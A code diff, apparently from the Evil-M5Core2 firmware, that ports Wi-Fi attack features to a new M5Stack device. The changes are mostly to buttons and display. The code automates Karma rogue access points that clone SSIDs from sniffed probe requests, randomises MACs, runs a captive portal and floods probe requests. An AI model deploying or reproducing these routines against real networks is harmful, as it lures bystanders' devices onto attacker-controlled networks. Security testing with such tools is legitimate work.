-  M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_RED);
-  M5.Display.setCursor(33, M5.Display.height() - 20);
+  M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
+  M5.Display.setCursor(100, M5.Display.height() - 40);
   M5.Display.println("Stop Sniff");
   M5.Display.setTextColor(TFT_WHITE);
 }
@@ -2604,6 +2672,8 @@ void startScanKarma() {
   ssid_count_Karma = 0;
   M5.Display.clear();
   drawStopButtonKarma();
+  ESP_BT.end();
+  bluetoothEnabled = false;
   esp_wifi_set_promiscuous(false);
   esp_wifi_stop();
   esp_wifi_set_promiscuous_rx_cb(NULL);
@@ -2639,24 +2709,23 @@ void stopScanKarma() {
         }
         Serial.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
     } else if (isProbeSniffingMode && ssid_count_Karma > 0) {
-        delay(1500);
         bool saveSSID = confirmPopup("   Save " + String(ssid_count_Karma) + " SSIDs?");
         if (saveSSID) {
             M5.Display.clear();
-            M5.Display.setCursor(0 , M5.Display.height()/ 2 );
+            M5.Display.setCursor(50 , M5.Display.height()/ 2 );
             M5.Display.println("Saving SSIDs on SD..");
             for (int i = 0; i < ssid_count_Karma; i++) {
                 saveSSIDToFile(ssidsKarma[i]);
             }
             M5.Display.clear();
-            M5.Display.setCursor(0 , M5.Display.height()/ 2 );
+            M5.Display.setCursor(50 , M5.Display.height()/ 2 );
             M5.Display.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
             Serial.println("-------------------");
             Serial.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
             Serial.println("-------------------");
         } else {
             M5.Display.clear();
-            M5.Display.setCursor(0 , M5.Display.height()/ 2 );
+            M5.Display.setCursor(50 , M5.Display.height()/ 2 );
             M5.Display.println("  No SSID saved.");
         }
         delay(1000);
@@ -2686,59 +2755,55 @@ void stopScanKarma() {
 
 void handleMenuInputKarma() {
     bool stateChanged = false;
-    static unsigned long buttonPressTime = 0;
-    static bool buttonPressed = false;
 
-    M5.update();
-    
-    if (M5.BtnA.wasPressed() && !buttonPressed) {
-        buttonPressed = true;
-        buttonPressTime = millis();  // Enregistrer le moment où le bouton est appuyé
-    } else if (!M5.BtnA.isPressed() && buttonPressed) {
-        unsigned long pressDuration = millis() - buttonPressTime;
-        buttonPressed = false;  // Réinitialiser l'état du bouton
-
-        if (pressDuration < 1000) {  // Appui court pour naviguer
-            currentIndexKarma++;
-            if (currentIndexKarma >= menuSizeKarma) {
-                currentIndexKarma = 0;
-            }
-            stateChanged = true;
-        } else {  // Appui long pour sélectionner
-            executeMenuItemKarma(currentIndexKarma);
-            stateChanged = true;
+    if (M5.BtnA.wasPressed()) {
+        currentIndexKarma--;
+        if (currentIndexKarma < 0) {
+            currentIndexKarma = menuSizeKarma - 1;
         }
+        stateChanged = true;
+    } else if (M5.BtnC.wasPressed()) {
+        currentIndexKarma++;
+        if (currentIndexKarma >= menuSizeKarma) {
+            currentIndexKarma = 0;
+        }
+        stateChanged = true;
     }
 
     if (stateChanged) {
-        // Ajustement de l'indice de départ pour l'affichage du menu si nécessaire
         menuStartIndexKarma = max(0, min(currentIndexKarma, menuSizeKarma - maxMenuDisplayKarma));
-        drawMenuKarma();  // Redessiner le menu avec le nouvel indice sélectionné
+    }
+
+    if (M5.BtnB.wasPressed()) {
+        executeMenuItemKarma(currentIndexKarma);
+        stateChanged = true; 
+    }
+    if (stateChanged) {
+        drawMenuKarma(); 
     }
 }
 
 
-
 void drawMenuKarma() {
     M5.Display.clear();
-    M5.Display.setTextSize(0);
+    M5.Display.setTextSize(2);
     M5.Display.setTextFont(1);
 
-    int lineHeight = 10;
-    int startX = 0;
-    int startY = 6;
+    int lineHeight = 24;
+    int startX = 10;
+    int startY = 25;
 
     for (int i = 0; i < maxMenuDisplayKarma; i++) {
         int menuIndexKarma = menuStartIndexKarma + i;
         if (menuIndexKarma >= menuSizeKarma) break;
 
         if (menuIndexKarma == currentIndexKarma) {
-            M5.Display.fillRect(0, i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
+            M5.Display.fillRect(0, startY + i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
             M5.Display.setTextColor(TFT_GREEN);
         } else {
             M5.Display.setTextColor(TFT_WHITE);
         }
-        M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 11);
+        M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 8);
         M5.Display.println(ssidsKarma[menuIndexKarma]);
     }
     M5.Display.display();
@@ -2779,16 +2844,20 @@ void startAPWithSSIDKarma(const char* ssid) {
         currentTime = millis();
         remainingTime = scanTimeKarma - ((currentTime - startTime) / 1000);
         clientCount = WiFi.softAPgetStationNum();
-        M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK); 
-        M5.Display.setCursor((M5.Display.width() - 12 * strlen(ssid)) / 2, 25); 
+
+        M5.Display.setCursor((M5.Display.width() - 12 * strlen(ssid)) / 2, 50); 
         M5.Display.println(String(ssid));
         
-        M5.Display.setCursor(10, 45);
+        int textWidth = 12 * 16; 
+        M5.Display.fillRect((M5.Display.width() - textWidth) / 2, 90, textWidth, 20, TFT_BLACK);
+        M5.Display.setCursor((M5.Display.width() - textWidth) / 2, 90);
         M5.Display.print("Left Time: ");
         M5.Display.print(remainingTime);
         M5.Display.println(" s");
- 
-        M5.Display.setCursor(10, 65);
+
+        textWidth = 12 * 20; 
+        M5.Display.fillRect((M5.Display.width() - textWidth) / 2, 130, textWidth, 20, TFT_BLACK);
+        M5.Display.setCursor((M5.Display.width() - textWidth) / 2, 130);
         M5.Display.print("Connected Client: ");
         M5.Display.println(clientCount);
 
@@ -2798,15 +2867,15 @@ void startAPWithSSIDKarma(const char* ssid) {
         Serial.println("Connected Client: "+ String(clientCount));
         Serial.println("-------------------");
 
-       M5.Lcd.setTextColor(TFT_WHITE); 
-       M5.Display.setCursor(33, 110);
+        
+       M5.Display.setCursor(130, 220);
        M5.Display.println(" Stop");
             M5.Display.display();
     
             if (remainingTime <= 0) {
                 break;
             }
-            if (M5.BtnA.wasPressed()) {
+            if (M5.BtnB.wasPressed()) {
                 break;
             }else {
               delay(200);
@@ -2814,7 +2883,7 @@ void startAPWithSSIDKarma(const char* ssid) {
     
         }
   M5.Display.clear();
-  M5.Display.setCursor(15 , M5.Display.height()/ 2 );
+  M5.Display.setCursor(50 , M5.Display.height()/ 2 );
   if (clientCount > 0) {
       M5.Display.println("Karma Successful!!!");
       Serial.println("-------------------");
@@ -2841,7 +2910,6 @@ void startAPWithSSIDKarma(const char* ssid) {
   drawMenu();  
 }
 
-
 void listProbes() {
     File file = SD.open("/probes.txt", FILE_READ);
     if (!file) {
@@ -2856,76 +2924,78 @@ void listProbes() {
     while (file.available() && numProbes < MAX_SSIDS_Karma) {
         String line = file.readStringUntil('\n');
         line.trim();
-        if (line.length() > 0) {
+        if (line.length() > 0 && !isProbePresent(probes, numProbes, line)) {
             probes[numProbes++] = line;
+
         }
     }
     file.close();
-
     if (numProbes == 0) {
-        Serial.println("No probes found");
-        waitAndReturnToMenu("No probes found");
+        Serial.println("-------------------");
+        Serial.println(" No probes found");
+        Serial.println("-------------------");
+        waitAndReturnToMenu(" No probes found");
         return;
     }
 
-    const int lineHeight = 18; // Hauteur de ligne pour l'affichage des SSIDs
-    const int maxDisplay = (128 - 10) / lineHeight; // Nombre maximum de lignes affichables, en laissant une marge en haut
+    const int maxDisplay = 11;
+    const int maxSSIDLength = 23; // Adjust based on your display width
     int currentListIndex = 0;
+    int listStartIndex = 0;
+    int selectedIndex = -1;
     bool needDisplayUpdate = true;
-    unsigned long buttonPressTime = 0;
-    bool buttonPressed = false;
 
-    while (true) {
+    while (selectedIndex == -1) {
         M5.update();
         handleDnsRequestSerial();
+        bool indexChanged = false;
+        if (M5.BtnA.wasPressed()) {
+            currentListIndex--;
+            if (currentListIndex < 0) currentListIndex = numProbes - 1;
+            indexChanged = true;
+        } else if (M5.BtnC.wasPressed()) {
+            currentListIndex++;
+            if (currentListIndex >= numProbes) currentListIndex = 0;
+            indexChanged = true;
+        } else if (M5.BtnB.wasPressed()) {
+            selectedIndex = currentListIndex;
+        }
 
-        if (M5.BtnA.wasPressed() && !buttonPressed) {
-            buttonPressed = true;
-            buttonPressTime = millis();
-        } else if (!M5.BtnA.isPressed() && buttonPressed) {
-            unsigned long pressDuration = millis() - buttonPressTime;
-            buttonPressed = false;
-
-            if (pressDuration < 1000) { // Appui court pour naviguer
-                currentListIndex = (currentListIndex + 1) % numProbes;
-                needDisplayUpdate = true;
-            } else { // Appui long pour sélectionner
-                Serial.println("SSID selected: " + probes[currentListIndex]);
-                clonedSSID = probes[currentListIndex];
-                waitAndReturnToMenu(probes[currentListIndex] + " selected");
-                return; // Sortie de la fonction après sélection
-            }
+        if (indexChanged) {
+            listStartIndex = max(0, min(currentListIndex, numProbes - maxDisplay));
+            needDisplayUpdate = true;
         }
 
         if (needDisplayUpdate) {
             M5.Display.clear();
-            M5.Display.setTextSize(1);
-            int y = 10; // Début de l'affichage en y
+            M5.Display.setTextSize(2);
+            int y = 10;
 
             for (int i = 0; i < maxDisplay; i++) {
-                int probeIndex = (currentListIndex + i) % numProbes;
-
-                if (i == 0) { // Mettre en évidence la sonde actuellement sélectionnée
-                    M5.Display.fillRect(0, y, M5.Display.width(), lineHeight, TFT_NAVY);
-                    M5.Display.setTextColor(TFT_GREEN);
-                } else {
-                    M5.Display.setTextColor(TFT_WHITE);
-                }
+                int probeIndex = listStartIndex + i;
+                if (probeIndex >= numProbes) break;
 
                 String ssid = probes[probeIndex];
-                M5.Display.setCursor(0, y);
+                if (ssid.length() > maxSSIDLength) {
+                    ssid = ssid.substring(0, maxSSIDLength) + "..";
+                }
+
+                M5.Display.setCursor(10, y);
+                M5.Display.setTextColor(probeIndex == currentListIndex ? TFT_GREEN : TFT_WHITE);
                 M5.Display.println(ssid);
-                y += lineHeight;
+                y += 20;
             }
 
             M5.Display.display();
             needDisplayUpdate = false;
         }
     }
+    Serial.println("-------------------");
+    Serial.println("SSID selected: " + probes[selectedIndex]);
+    Serial.println("-------------------");
+    clonedSSID = probes[selectedIndex];
+    waitAndReturnToMenu(probes[selectedIndex] + " selected");
 }
-
-
-
 
 
 
@@ -2941,138 +3011,140 @@ bool isProbePresent(String probes[], int numProbes, String probe) {
 
 
 void deleteProbe() {
-    File file = SD.open("/probes.txt", FILE_READ);
-    if (!file) {
-        Serial.println("Failed to open probes.txt");
-        waitAndReturnToMenu("Failed to open probes.txt");
-        return;
-    }
+  File file = SD.open("/probes.txt", FILE_READ);
+  if (!file) {
+      Serial.println("-------------------");
+      Serial.println("Failed to open probes.txt");
+      Serial.println("-------------------");
+      waitAndReturnToMenu("Failed to open probes.txt");
+      return;
+  }
 
-    String probes[MAX_SSIDS_Karma];
-    int numProbes = 0;
+  String probes[MAX_SSIDS_Karma];
+  int numProbes = 0;
 
-    while (file.available() && numProbes < MAX_SSIDS_Karma) {
-        String line = file.readStringUntil('\n');
-        line.trim();
-        if (line.length() > 0) {
-            probes[numProbes++] = line;
-        }
-    }
-    file.close();
+  while (file.available() && numProbes < MAX_SSIDS_Karma) {
+      String line = file.readStringUntil('\n');
+      line.trim();
+      if (line.length() > 0) {
+          probes[numProbes++] = line;
+      }
+  }
+  file.close();
 
-    if (numProbes == 0) {
-        waitAndReturnToMenu("No probes found");
-        return;
-    }
+  if (numProbes == 0) {
+      waitAndReturnToMenu("No probes found");
+      return;
+  }
 
-    const int lineHeight = 18;  // Adapté à l'écran de 128x128
-    const int maxDisplay = (128 - 10) / lineHeight;  // Calcul du nombre maximal de lignes affichables
-    int currentListIndex = 0;
-    int selectedIndex = -1;
-    bool needDisplayUpdate = true;
-    static bool buttonPressed = false;
-    static unsigned long buttonPressTime = 0;
+  const int maxSSIDLength = 23; // Adjust based on your display width
+  const int maxDisplay = 11;
+  int currentListIndex = 0;
+  int listStartIndex = 0;
+  int selectedIndex = -1;
+  bool needDisplayUpdate = true;
 
-    while (selectedIndex == -1) {
-        M5.update();
-        handleDnsRequestSerial();
+  while (selectedIndex == -1) {
+      M5.update();
+      handleDnsRequestSerial();
+      if (needDisplayUpdate) {
+          M5.Display.clear();
+          M5.Display.setTextSize(2);
 
-        if (M5.BtnA.wasPressed() && !buttonPressed) {
-            buttonPressed = true;
-            buttonPressTime = millis();
-        } else if (!M5.BtnA.isPressed() && buttonPressed) {
-            unsigned long pressDuration = millis() - buttonPressTime;
-            buttonPressed = false;  // Reset button state
+          for (int i = 0; i < maxDisplay; i++) {
+              int probeIndex = listStartIndex + i;
+              if (probeIndex >= numProbes) break;
 
-            if (pressDuration < 1000) {  // Short press for navigation
-                currentListIndex++;
-                if (currentListIndex > numProbes) currentListIndex = 0;
-                needDisplayUpdate = true;
-            } else {  // Long press for selection
-                selectedIndex = currentListIndex;
-            }
-        }
+              String ssid = probes[probeIndex];
+              if (ssid.length() > maxSSIDLength) {
+                  ssid = ssid.substring(0, maxSSIDLength) + "..";
+              }
 
-        if (needDisplayUpdate) {
-            M5.Display.clear();
-            M5.Display.setTextSize(0);
+              M5.Display.setCursor(10, i * 20 + 10);
+              M5.Display.setTextColor(probeIndex == currentListIndex ? TFT_GREEN : TFT_WHITE);
+              M5.Display.println(ssid);
+          }
 
-            for (int i = 0; i < maxDisplay && i + currentListIndex < numProbes; i++) {
-                int probeIndex = currentListIndex + i;
-                String ssid = probes[probeIndex];
-                ssid = ssid.substring(0, min(ssid.length(), (unsigned int)21));  // Tronquer pour l'affichage
-                M5.Display.setCursor(0, i * lineHeight + 10);
-                M5.Display.setTextColor(probeIndex == currentListIndex ? TFT_GREEN : TFT_WHITE);
-                M5.Display.println(ssid);
-            }
+          M5.Display.display();
+          needDisplayUpdate = false;
+      }
 
-            M5.Display.display();
-            needDisplayUpdate = false;
-        }
-    }
+      if (M5.BtnA.wasPressed()) {
+          currentListIndex--;
+          if (currentListIndex < 0) currentListIndex = numProbes - 1;
+          needDisplayUpdate = true;
+      } else if (M5.BtnC.wasPressed()) {
+          currentListIndex++;
+          if (currentListIndex >= numProbes) currentListIndex = 0;
+          needDisplayUpdate = true;
+      } else if (M5.BtnB.wasPressed()) {
+          selectedIndex = currentListIndex;
+      }
 
-    // Gestion de la sélection
-    if (selectedIndex >= 0 && selectedIndex < numProbes) {
-        String selectedProbe = probes[selectedIndex];
-        if (confirmPopup("Delete " + selectedProbe + " probe ?")) {
-            bool success = removeProbeFromFile("/probes.txt", selectedProbe);
-            if (success) {
-                Serial.println(selectedProbe + " deleted");
-                waitAndReturnToMenu(selectedProbe + " deleted");
-            } else {
-                waitAndReturnToMenu("Error deleting probe");
-            }
-        }
-    } else {
-        waitAndReturnToMenu("No probe selected");
-    }
+      listStartIndex = max(0, min(currentListIndex, numProbes - maxDisplay));
+  }
+
+  bool success = false;
+  if (selectedIndex >= 0 && selectedIndex < numProbes) {
+      String selectedProbe = probes[selectedIndex];
+      if (confirmPopup("Delete " + selectedProbe + " probe ?")) {
+          success = removeProbeFromFile("/probes.txt", selectedProbe);
+      }
+
+      if (success) {
+            Serial.println("-------------------");
+            Serial.println(selectedProbe + " deleted");
+            Serial.println("-------------------");
+          waitAndReturnToMenu(selectedProbe + " deleted");
+      } else {
+          waitAndReturnToMenu("Error deleting probe");
+      }
+  } else {
+      waitAndReturnToMenu("No probe selected");
+  }
 }
 
 
 
-
 int showProbesAndSelect(String probes[], int numProbes) {
-    const int lineHeight = 18;  // Adapté à l'écran de 128x128
-    const int maxDisplay = (128 - 10) / lineHeight;  // Calcul du nombre maximal de lignes affichables
-    int currentListIndex = 0;  // Index de l'élément actuel dans la liste
-    int selectedIndex = -1;  // -1 signifie aucune sélection
+    const int maxDisplay = 11; // Maximum number of items to display at once
+    int currentListIndex = 0; // Index of the current item in the list
+    int listStartIndex = 0; // Index of the first item to display
     bool needDisplayUpdate = true;
-    static bool buttonPressed = false;
-    static unsigned long buttonPressTime = 0;
+    int selectedIndex = -1; // -1 means no selection
 
     while (selectedIndex == -1) {
         M5.update();
         handleDnsRequestSerial();
-
-        if (M5.BtnA.wasPressed() && !buttonPressed) {
-            buttonPressed = true;
-            buttonPressTime = millis();
-        } else if (!M5.BtnA.isPressed() && buttonPressed) {
-            unsigned long pressDuration = millis() - buttonPressTime;
-            buttonPressed = false;  // Réinitialiser l'état du bouton
-
-            if (pressDuration < 1000) {  // Appui court pour la navigation
-                currentListIndex--;
-                if (currentListIndex < 0) currentListIndex = numProbes - 1;
-                needDisplayUpdate = true;
-            } else {  // Appui long pour la sélection
-                selectedIndex = currentListIndex;
-            }
-        }
-
         if (needDisplayUpdate) {
             M5.Display.clear();
-            M5.Display.setTextSize(0);
+            M5.Display.setTextSize(2);
 
-            for (int i = 0; i < maxDisplay && currentListIndex + i < numProbes; i++) {
-                M5.Display.setCursor(10, i * lineHeight + 10);
-                M5.Display.setTextColor(i == 0 ? TFT_GREEN : TFT_WHITE);  // Met en surbrillance l'élément actuel
-                M5.Display.println(probes[currentListIndex + i]);
+            for (int i = 0; i < maxDisplay && (listStartIndex + i) < numProbes; i++) {
+                M5.Display.setCursor(10, i * 20 + 10);
+                M5.Display.setTextColor((listStartIndex + i) == currentListIndex ? TFT_GREEN : TFT_WHITE);
+                M5.Display.println(probes[listStartIndex + i]);
             }
-
             M5.Display.display();
             needDisplayUpdate = false;
         }
+
+        if (M5.BtnA.wasPressed()) {
+            currentListIndex--;
+            if (currentListIndex < 0) {
+                currentListIndex = numProbes - 1; 
+            }
+            needDisplayUpdate = true;
+        } else if (M5.BtnC.wasPressed()) {
+            currentListIndex++;
+            if (currentListIndex >= numProbes) {
+                currentListIndex = 0;
+            }
+            needDisplayUpdate = true;
+        } else if (M5.BtnB.wasPressed()) {
+            selectedIndex = currentListIndex; 
+        }
+        listStartIndex = max(0, min(currentListIndex - maxDisplay + 1, numProbes - maxDisplay));
     }
 
     return selectedIndex;
@@ -3240,13 +3312,13 @@ void probeAttack() {
     const int debounceDelay = 200; 
     unsigned long lastDebounceTime = 0;
     
-    M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_RED);
-    M5.Display.setCursor(50, M5.Display.height() - 20);
-    M5.Display.println("Stop");
+    M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
+    M5.Display.setCursor(135, M5.Display.height() - 40);
     M5.Display.setTextColor(TFT_WHITE);
+    M5.Display.println("Stop");
     
-    int probesTextX = 0;
-    String probesText = "Probe Attack running.";
+    int probesTextX = 10;
+    String probesText = "Probe Attack running...";
     M5.Display.setCursor(probesTextX, 50);
     M5.Display.println(probesText);
     probesText = "Probes sent: ";
@@ -3281,20 +3353,28 @@ void probeAttack() {
             }
             WiFi.begin(ssid.c_str(), "");
 
-          M5.Display.setCursor(probesTextX + 12, 80);
-          M5.Display.fillRect(probesTextX +  12, 80, 40, 10, TFT_BLACK);
+          M5.Display.setCursor(probesTextX + probesText.length() * 12, 70);
+          M5.Display.fillRect(probesTextX + probesText.length() * 12, 70, 50, 20, TFT_BLACK);
           M5.Display.print(++probeCount);
 
           M5.Display.fillRect(100, M5.Display.height() / 2, 140, 20, TFT_BLACK);
 
           M5.Display.setCursor(100, M5.Display.height() / 2);
-         // M5.Display.print("Delay: " + String(delayTime) + "ms");
+          M5.Display.print("Delay: " + String(delayTime) + "ms");
 
             Serial.println("Probe sent: " + ssid);
       }
 
       M5.update();
       if (M5.BtnA.wasPressed() && currentMillis - lastDebounceTime > debounceDelay) {
+          lastDebounceTime = currentMillis;
+          delayTime = max(200, delayTime - 100); // min delay
+      }
+      if (M5.BtnC.wasPressed() && currentMillis - lastDebounceTime > debounceDelay) {
+          lastDebounceTime = currentMillis;
+          delayTime = min(1000, delayTime + 100); // max delay
+      }
+      if (M5.BtnB.wasPressed() && currentMillis - lastDebounceTime > debounceDelay) {
           isProbeAttackRunning = false;
       }
 
@@ -3341,6 +3421,8 @@ void restoreOriginalWiFiSettings() {
 bool isAPDeploying = false;
 
 void startAutoKarma() {
+  ESP_BT.end();
+  bluetoothEnabled = false;
   esp_wifi_set_promiscuous(false);
   esp_wifi_stop();
   esp_wifi_set_promiscuous_rx_cb(NULL);
@@ -3497,7 +3579,7 @@ void loopAutoKarma() {
   while (isAutoKarmaActive) {
       M5.update();
 
-      if (M5.BtnA.wasPressed()) {
+      if (M5.BtnB.wasPressed()) {
           isAutoKarmaActive = false;
           isAPDeploying = false;
           isAutoKarmaActive = false;
@@ -3538,73 +3620,111 @@ void loopAutoKarma() {
 }
 
 void activateAPForAutoKarma(const char* ssid) {
-   if (isSSIDWhitelisted(ssid)) {
-        Serial.println("-------------------");
-        Serial.println("SSID in the whitelist, skipping : " + String(ssid));
-        Serial.println("-------------------");
-        return;
-    }
+    karmaSuccess = false;
+    if (isSSIDWhitelisted(ssid)) {
+      Serial.println("-------------------");
+      Serial.println("SSID in the whitelist, skipping : " + String(ssid));
+      Serial.println("-------------------");
+      if (ledOn){
+          pixels.setPixelColor(0, pixels.Color(255,255,255)); 
+          pixels.setPixelColor(9, pixels.Color(255,255,255)); 
+          pixels.show(); 
+          delay(50); 
+          pixels.setPixelColor(0, pixels.Color(0,0,0)); 
+          pixels.setPixelColor(9, pixels.Color(0,0,0)); 
+          pixels.show(); 
+        }
+      return;
+  }
   if (strcmp(ssid, lastDeployedSSID) == 0) {
       Serial.println("-------------------");
       Serial.println("Skipping already deployed probe : " + String(lastDeployedSSID));
       Serial.println("-------------------");
+      if (ledOn){
+        pixels.setPixelColor(0, pixels.Color(0,255,0)); 
+        pixels.setPixelColor(9, pixels.Color(0,255,0)); 
+        pixels.show(); 
+        delay(50); 
+        pixels.setPixelColor(0, pixels.Color(0,0,0)); 
+        pixels.setPixelColor(9, pixels.Color(0,0,0)); 
+        pixels.show(); 
+      }
       return; 
   }
-
+  if (ledOn){
+    pixels.setPixelColor(0, pixels.Color(255,0,0)); 
+    pixels.setPixelColor(9, pixels.Color(255,0,0)); 
+    pixels.show(); 
+  }
   isAPDeploying = true;
   isInitialDisplayDone = false;
+  setRandomMAC_APKarma(); // Set random MAC for AP          
+  
   if (captivePortalPassword == ""){
      WiFi.softAP(ssid);
   }else{
      WiFi.softAP(ssid ,captivePortalPassword.c_str());
   }
-  DNSServer dnsServer;
-  WebServer server(80);
-
+  // Display MAC, SSID, and channel
+  String macAddress = getMACAddress();
   Serial.println("-------------------");
   Serial.println("Starting Karma AP for : " + String(ssid));
+  Serial.print("MAC Address: "); Serial.println(macAddress);
   Serial.println("Time :" + String(autoKarmaAPDuration / 1000) + " s" );
   Serial.println("-------------------");
   unsigned long startTime = millis();
 
   while (millis() - startTime < autoKarmaAPDuration) {
       displayAPStatus(ssid, startTime, autoKarmaAPDuration);
-      dnsServer.processNextRequest();
-      server.handleClient();
+      handleDnsRequestSerial();
 
       M5.update();
 
-      if (M5.BtnA.wasPressed()) {
+      if (M5.BtnB.wasPressed()) {
           memset(lastDeployedSSID, 0, sizeof(lastDeployedSSID));
+            if (ledOn){
+                pixels.setPixelColor(0, pixels.Color(0,0,0)); 
+                pixels.setPixelColor(9, pixels.Color(0,0,0)); 
+                pixels.show(); 
+              }
           break;
       }
 
       int clientCount = WiFi.softAPgetStationNum();
       if (clientCount > 0) {
+          karmaSuccess = true;
           clonedSSID = String(ssid);
+          isCaptivePortalOn = true;
           isAPDeploying = false;
           isAutoKarmaActive = false;
           isInitialDisplayDone = false;
+          inMenu = true;
           Serial.println("-------------------");
           Serial.println("Karma Successful for : " + String(clonedSSID));
           Serial.println("-------------------");
           memset(lastSSID, 0, sizeof(lastSSID));
           newSSIDAvailable = false;
-          M5.Display.clear();
-          M5.Display.setCursor(0 , 32);
-          M5.Display.println("Karma Successfull !!!");
-          M5.Display.setCursor(0 , 48);
-          M5.Display.println("On : " + clonedSSID);
-          delay(7000);
-          WiFi.softAPdisconnect(true);
+          waitAndReturnToMenu("Karma Successful !!! ");
           return;
       }
-
       delay(100);
   }
   strncpy(lastDeployedSSID, ssid, sizeof(lastDeployedSSID) - 1);
   
   WiFi.softAPdisconnect(true);
+  WiFi.mode(WIFI_MODE_STA);
+  ESP_BT.end();
+  bluetoothEnabled = false;
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_stop();
+  esp_wifi_set_promiscuous_rx_cb(NULL);
+  esp_wifi_deinit();
+  delay(300); // Petite pause pour s'assurer que tout est terminé
+  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg);
+  esp_wifi_start();
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(&autoKarmaPacketSniffer);
   isAPDeploying = false;
   isWaitingForProbeDisplayed = false;
 
@@ -3613,36 +3733,39 @@ void activateAPForAutoKarma(const char* ssid) {
   Serial.println("-------------------");
   Serial.println("Karma Fail for : " + String(ssid));
   Serial.println("-------------------");
+  
+    if (ledOn){
+    pixels.setPixelColor(0, pixels.Color(0,0,0)); 
+    pixels.setPixelColor(9, pixels.Color(0,0,0)); 
+    pixels.show(); 
+  }
 }
 
 
 void displayWaitingForProbe() {
-  M5.Display.setCursor(0, 0);
   if (!isWaitingForProbeDisplayed) {
       M5.Display.clear();
-      M5.Display.setTextSize(0);
       M5.Display.setTextColor(TFT_WHITE);
-      M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 60, TFT_RED);
-      M5.Display.setCursor(40, M5.Display.height() - 20);
+      M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
+      M5.Display.setCursor(100, M5.Display.height() - 40);
       M5.Display.println("Stop Auto");
-      M5.Display.setCursor(0, M5.Display.height() / 2 - 20);
+      M5.Display.setCursor(50, M5.Display.height() / 2 - 20);
       M5.Display.print("Waiting for probe");
 
       isWaitingForProbeDisplayed = true;
   }
 
-unsigned long currentTime = millis();
+  unsigned long currentTime = millis();
   if (currentTime - lastProbeDisplayUpdate > 1000) {
       lastProbeDisplayUpdate = currentTime;
       probeDisplayState = (probeDisplayState + 1) % 4;
 
-      // Calculer la position X pour l'animation des points
-      int textWidth = M5.Display.textWidth("Waiting for probe ");
-      int x = textWidth;
+      int x = 50 + 12 * strlen("Waiting for probe");
       int y = M5.Display.height() / 2 - 20;
-
-      // Effacer la zone derrière les points
-      M5.Display.fillRect(x, y, M5.Display.textWidth("..."), M5.Display.fontHeight(), TFT_BLACK);
+      int width = 36; 
+      int height = 20;
+      
+      M5.Display.fillRect(x, y, width, height, TFT_BLACK);
       
       M5.Display.setCursor(x, y);
       for (int i = 0; i < probeDisplayState; i++) {
@@ -3655,37 +3778,32 @@ void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPD
   unsigned long currentTime = millis();
   int remainingTime = autoKarmaAPDuration / 1000 - ((currentTime - startTime) / 1000);
   int clientCount = WiFi.softAPgetStationNum();
-  M5.Display.setTextSize(0);
-  M5.Display.setCursor(0, 0);
+
   if (!isInitialDisplayDone) {
       M5.Display.clear();
       M5.Display.setTextColor(TFT_WHITE);
-
-      M5.Display.setCursor(0, 10); 
+      M5.Display.setCursor((M5.Display.width() - 12 * strlen(ssid)) / 2, 50); 
       M5.Display.println(String(ssid));
-      
-      M5.Display.setCursor(0, 30);
+      M5.Display.setCursor((M5.Display.width() - 15 * strlen("Left Time: ")) / 2, 90);
       M5.Display.print("Left Time: ");
-      M5.Display.setCursor(0, 50);
+      M5.Display.setCursor((M5.Display.width() - 12 * strlen("Connected Client: ")) / 2, 130);
       M5.Display.print("Connected Client: ");
-      // Affichage du bouton Stop
-      M5.Display.setCursor(50, M5.Display.height() - 10);
+
+      M5.Display.setCursor(140, 220);
       M5.Display.println("Stop");
-      
       isInitialDisplayDone = true;
   }
-  int timeValuePosX = M5.Display.textWidth("Left Time: ");
-  int timeValuePosY = 30;
-  M5.Display.fillRect(timeValuePosX, 20 , 25, 20, TFT_BLACK);
-  M5.Display.setTextColor(TFT_WHITE);
+
+  int timeValuePosX = (M5.Display.width() + 12 * strlen("Left Time: ")) / 2;
+  int timeValuePosY = 90;
+  M5.Display.fillRect(timeValuePosX, timeValuePosY, 12 * 5, 20, TFT_BLACK);
   M5.Display.setCursor(timeValuePosX, timeValuePosY);
   M5.Display.print(remainingTime);
-  M5.Display.print(" s");
+  M5.Display.println(" s");
 
-  int clientValuePosX = M5.Display.textWidth("Connected Client: ");
-  int clientValuePosY = 50;
-  M5.Display.fillRect(clientValuePosX, 40 , 25 , 20, TFT_BLACK); 
-  M5.Display.setTextColor(TFT_WHITE);
+  int clientValuePosX = (M5.Display.width() + 12 * strlen("Connected Client: ")) / 2;
+  int clientValuePosY = 130;
+  M5.Display.fillRect(clientValuePosX, clientValuePosY, 12 * 5, 20, TFT_BLACK);
   M5.Display.setCursor(clientValuePosX, clientValuePosY);
   M5.Display.print(clientCount);
 }
@@ -3695,12 +3813,12 @@ void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPD
 
 String createPreHeader() {
     String preHeader = "WigleWifi-1.4";
-    preHeader += ",appRelease=v1.1.5"; // Remplacez [version] par la version de votre application
-    preHeader += ",model=AtonS3";
-    preHeader += ",release=v1.1.5"; // Remplacez [release] par la version de l'OS de l'appareil
-    preHeader += ",device=Evil-AtomS3"; // Remplacez [device name] par un nom de périphérique, si souhaité
+    preHeader += ",appRelease=v1.1.6"; // Remplacez [version] par la version de votre application
+    preHeader += ",model=Core2";
+    preHeader += ",release=v1.1.6"; // Remplacez [release] par la version de l'OS de l'appareil
+    preHeader += ",device=Evil-M5Core2"; // Remplacez [device name] par un nom de périphérique, si souhaité
     preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
